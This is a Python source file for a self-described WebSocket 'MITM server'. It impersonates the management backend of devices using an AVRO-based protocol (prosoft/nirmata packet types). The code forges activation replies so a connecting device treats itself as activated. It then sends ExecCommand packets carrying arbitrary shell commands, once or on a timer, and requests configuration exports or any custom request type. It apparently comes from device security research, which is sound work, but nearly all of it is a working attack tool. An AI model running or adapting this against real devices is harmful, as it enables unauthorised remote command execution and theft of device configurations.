
# file: wss_server.py
import asyncio
import ssl
import logging
import base64
import sys
import shlex
from typing import Optional, List
import websockets
from websockets.server import WebSocketServerProtocol
import avro_implementation
import uuid
from time import sleep

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")


class WssServer:
    """
    WS(S) MITM-Server mit:
      - Handler-Dispatch für eingehende AVRO-Pakete
      - Aktivierungs-Event nach ClientConnect
      - Outbound-Queue + Sender-Loop
      - Public API: queue_packet(), send_now(), wait_activated()
    """
    def __init__(
        self,
        host: str,
        port: int,
        certfile: str,
        keyfile: str,
        require_client_cert: bool = False,
    ):
        self.host = host
        self.port = port
        self.ssl_context = self._build_ssl_context(certfile, keyfile, require_client_cert)

        # Verbindung/State
        self.client_ws: Optional[WebSocketServerProtocol] = None
        self.client_connected: bool = False
        self.client_activated: bool = False
        self.activated_evt = asyncio.Event()
        self.print_all = False

        # Outgoing-Queue + Sender-Task
        self.outbox: asyncio.Queue[bytes] = asyncio.Queue(maxsize=1000)
        self.sender_task: Optional[asyncio.Task] = None

        # Handler-Registry: packet_type -> callable(packet, instance) -> Optional[bytes]
        self.handlers = {}

   # -------- TLS ----------
    @staticmethod
    def _build_ssl_context(certfile: str, keyfile: str, require_client_cert: bool) -> ssl.SSLContext:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.minimum_version = ssl.TLSVersion.TLSv1_2
        ctx.load_cert_chain(certfile=certfile, keyfile=keyfile)
        # Optional mTLS – aktuell deaktiviert, kann hier ergänzt werden
        ctx.options |= ssl.OP_NO_COMPRESSION
        return ctx

    # -------- Public API ----------
    async def queue_packet(self, data: bytes) -> None:
        """Paket in die Outbox legen (wird gesendet sobald möglich)."""
        await self.outbox.put(data)
        logging.info("Queued outbound packet (%d bytes)", len(data))

    async def send_now(self, data: bytes) -> None:
        """Sofort senden (ohne Queue), falls verbunden."""
        if not self.client_ws:
            logging.warning("send_now(): Kein Client verbunden.")
            return
        await self.client_ws.send(data)
        logging.info("Sent immediate packet (%d bytes)", len(data))

    async def wait_activated(self, timeout: Optional[float] = None) -> None:
        """Wartet bis ClientConnect-Flow abgeschlossen wurde."""
        if self.client_activated:
            return
        if timeout is None:
            await self.activated_evt.wait()
        else:
            await asyncio.wait_for(self.activated_evt.wait(), timeout=timeout)

    # -------- Internals ----------
    async def _sender_loop(self):
        logging.info("Sender loop started.")
        try:
            while True:
                data = await self.outbox.get()
                if not self.client_ws:
                    logging.warning("Packet dropped – no client connected.")
                    continue
                try:
                    await self.client_ws.send(data)
                    logging.info("Sent queued packet (%d bytes)", len(data))
                except Exception as e:
                    logging.error("Failed to send queued packet: %s", e)
        except asyncio.CancelledError:
            logging.info("Sender loop cancelled.")

    async def handle_client(self, ws: WebSocketServerProtocol):
        peer = f"{ws.remote_address[0]}:{ws.remote_address[1]}"
        self.client_ws = ws
        self.client_connected = True
        logging.info("Client connected: %s", peer)

        try:
            async for message in ws:
                if isinstance(message, bytes):
                    response = self.on_binary_message(message)
                    if response is not None:
                        await ws.send(response)
                else:
                    logging.info("Received unexpected TEXT frame: %r", message)

        except websockets.ConnectionClosed:
            logging.info("Connection closed: %s", peer)
        except Exception as e:
            logging.exception("Error in handle_client for %s: %s", peer, e)
        finally:
            logging.info("Client disconnected: %s", peer)
            self.client_ws = None
            self.client_connected = False
            # Reset Activation für nächste Session
            self.client_activated = False
            self.activated_evt = asyncio.Event()

    def add_handler(self, command_name: str, handler):
        """Registriere Handler für konkreten AVRO-Type-String."""
        self.handlers[command_name] = handler

    def on_binary_message(self, data: bytes) -> Optional[bytes]:
        """Decoding + Dispatch auf registrierte Handler."""
        logging.debug("Received (%d bytes)", len(data))
        packet = avro_implementation.AVROBuilder.parse(data)
        if not packet:
            logging.debug("Received an unknown packet")
            logging.debug(data)
            return None
        packet_type = packet._mainparameters.get('type', '')
        logging.debug("Packet type: %s", packet_type)
        if self.print_all:
            logging.info(str(packet))

        handler = self.handlers.get(packet_type)
        if handler:
            # Handler-Signatur: handler(packet, instance) -> Optional[bytes]
            return handler(packet, self)
        return None

    async def run(self):
        # Sender-Loop starten
        self.sender_task = asyncio.create_task(self._sender_loop())

        async with websockets.serve(
            handler=self.handle_client,
            host=self.host,
            port=self.port,
            ssl=self.ssl_context,
            max_size=None,
            ping_interval=20,
            ping_timeout=20,
        ):
            logging.info("WSS MITM Server started on %s:%s", self.host, self.port)
            try:
                await asyncio.Future()  # run forever
            finally:
                if self.sender_task:
                    self.sender_task.cancel()
                    with contextlib.suppress(asyncio.CancelledError):
                        await self.sender_task


# -------- Handlers --------

def make_activation_handler(cfg):
    """
    Returns a handler based on cfg
    """
    def handler(packet, instance: WssServer):
        logging.info("[activation] incoming ClientConnect")

        params = packet._mainparameters
        reply = dict(params)
        reply['type'] = 'com.prosoft.avro.SetActivationKeyRequest'
        reply['body'] = {
            'activationKey': cfg['activationKey'],
            'activationState': cfg['activationState'],
        }

        if cfg['activationState'] == 'ACTIVATED':
            instance.client_activated = True
            instance.activated_evt.set()
            logging.info("[activation] completed -> state=%s", cfg['activationState'])

        logging.info("[activation] sending back activation key %s", cfg['activationKey'])
        return avro_implementation.AVROBuilder(reply).build()

    return handler


def handle_connect(packet, instance: WssServer) -> Optional[bytes]:
    """
    Reagiert auf 'com.nirmata.avro.ClientConnect' und aktiviert Instanz.
    Antwort: SetActivationKeyRequest (leer) -> ACTIVATED
    """
    logging.info("Got activation request")

    params = packet._mainparameters
    params['type'] = 'com.prosoft.avro.SetActivationKeyRequest'
    params['body'] = {'activationKey': '', 'activationState': 'ACTIVATED'}

    instance.client_activated = True
    instance.activated_evt.set()

    logging.info("Activation complete; sending ACK")
    return avro_implementation.AVROBuilder(params).build()

def print_handler(ptype):
    def handler(packet, instance: WssServer):
        if "type" in packet._mainparameters and packet._mainparameters['type'] == ptype:
            logging.info("[handler] Got a packet of requested type %s", ptype)
            logging.info(str(packet))

    return handler


# -------- Hilfsfunktionen für Payloads --------

def build_packet(content) -> bytes:
    """
    Builder for AVRO packets
    """
    parameters = {
        'sequenceId': f"H{uuid.uuid4()}",
        'source': '00:01:02:03:04:05',
        'clientId': '00:01:02:03:04:05',
    }
    return avro_implementation.AVROBuilder(parameters|content).build()

async def wait_activated(server: WssServer):
    server.add_handler('com.nirmata.avro.ClientConnect', make_activation_handler({'activationKey': '', 'activationState': 'ACTIVATED'}))
    await server.wait_activated()

# -------- Flows (Subcommands) --------

async def flow_activate_only(server: WssServer, args):
    logging.info("[flow:activate-only] Waiting for activation …")
    # Make sure that we see all packets from now on
    await wait_activated(server)
    server.print_all = True
    logging.info("[flow:activate-only] Activated.")


async def flow_exec_cmd(server: WssServer, args):
    """
    Nach Activation einen ExecCommand senden:
      --cmd /usr/bin/ping --arg 192.168.20.201
      --once  (nur einmal)  oder  --interval 5.0 (periodisch)
    """
    await wait_activated(server)
    logging.info("[flow:exec-cmd] Activated => starting flow")
    server.add_handler("com.prosoft.avro.ExecCommandResponse", print_handler("com.prosoft.avro.ExecCommandResponse"))

    await asyncio.sleep(5)
    if args.once:
        pkt = build_packet({ 'type': 'com.prosoft.avro.ExecCommand',
                          'body': { 'cmd': args.cmd } })
        await server.queue_packet(pkt)
        logging.info("[flow:exec-cmd] sent: %s", pkt)
        logging.info("[flow:exec-cmd] sent once.")
        return

    interval = args.interval
    if interval <= 0:
        interval = 5.0
    while True:
        pkt = build_packet({ 'type': 'com.prosoft.avro.ExecCommand',
                             'body': { 'cmd': args.cmd } })
        await server.queue_packet(pkt)
        await asyncio.sleep(interval)

async def flow_activation_key(server: WssServer, args):
    logging.info("[flow:activation_key] Sending a custom activation key")
    server.add_handler('com.nirmata.avro.ClientConnect', make_activation_handler({'activationKey': args.activation_key, 'activationState': 'NOT_ACTIVATED'}))
   
async def flow_export_config(server: WssServer, args):
    await wait_activated(server)
    logging.info("[flow:export_config] Sending a 'com.prosoft.avro.ExportConfigurationRequest'")

    pkt = build_packet({ 'type': 'com.prosoft.avro.ExportConfigurationRequest'})
    server.print_all = True
    await server.queue_packet(pkt)
    logging.info("[flow:export_config] Sent request")

async def flow_custom_request(server: WssServer, args):
    await wait_activated(server)
    logging.info("[flow:custom_request] Sending a '%s'", args.request)

    pkt = build_packet({ 'type': args.request})
    server.print_all = True
    await server.queue_packet(pkt)
    logging.info("[flow:custom_request] Sent request")


# -------- CLI / Subparsers --------

import argparse
import contextlib

def build_arg_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(description="WSS MITM Server for AVRO")
    p.add_argument("--host", default="0.0.0.0")
    p.add_argument("--port", type=int, default=443)
    p.add_argument("--certfile", required=True, help="Server cert (PEM)")
    p.add_argument("--keyfile", required=True, help="Server key (PEM)")

    sub = p.add_subparsers(dest="flow", required=True, metavar="FLOW")

    # activate-only
    sp = sub.add_parser("activate-only", help="Only activate, no outbound packets (to grab log information)")
    sp.set_defaults(flow_func=flow_activate_only)

    # exec-cmd
    sp = sub.add_parser("exec-cmd", help="Send a command")
    sp.add_argument("--cmd", nargs="+", required=True, help="e.g. /usr/bin/ping")
    grp = sp.add_mutually_exclusive_group()
    grp.add_argument("--once", action="store_true", help="Send once")
    grp.add_argument("--interval", type=float, default=5.0, help="Send in intervals until closed (default: 5.0)")
    sp.set_defaults(flow_func=flow_exec_cmd)

    # Activate with custom key
    sp = sub.add_parser("activationkey", help="Send a custom activation key")
    sp.add_argument("--activation-key", required=True, help="The activation key to send to the device")
    sp.set_defaults(flow_func=flow_activation_key)

    # Export config from device
    sp = sub.add_parser("exportconfig", help="Perform an export of the device config")
    sp.set_defaults(flow_func=flow_export_config)

    # Custom request (does not yet support a custom body)
    sp = sub.add_parser("customrequest", help="Perform a custom request")
    sp.add_argument("--request", required=True, help="The request to send")
    sp.set_defaults(flow_func=flow_custom_request)

    return p


async def main():
    parser = build_arg_parser()
    args = parser.parse_args()

    server = WssServer(
        host=args.host,
        port=args.port,
        certfile=args.certfile,
        keyfile=args.keyfile,
        # require_client_cert=args.require_client_cert,
    )

    # Flow starten (parallel zum Server)
    flow_task = asyncio.create_task(args.flow_func(server, args))
    await server.run()


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass

